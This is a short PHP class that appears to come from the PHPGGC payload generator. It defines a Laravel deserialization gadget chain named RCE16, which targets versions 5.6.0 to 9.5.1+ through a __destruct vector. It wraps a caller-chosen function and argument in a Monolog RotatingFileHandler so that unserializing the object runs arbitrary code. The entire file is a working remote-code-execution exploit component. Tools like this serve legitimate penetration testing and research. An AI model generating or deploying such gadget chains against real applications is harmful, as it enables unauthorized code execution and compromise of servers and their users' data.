<?php

namespace GadgetChain\Laravel;

class RCE16 extends \PHPGGC\GadgetChain\RCE\FunctionCall
{
    public static $version = '5.6.0 <= v9.5.1+';
    public static $vector = '__destruct';
    public static $author = 'CyanM0un';
    public static $information = '';

    public function generate(array $parameters)
    {
        $function = $parameters['function'];
        $param = $parameters['parameter'];
        
        return new \Monolog\Handler\RotatingFileHandler($function,$param);
    }
}
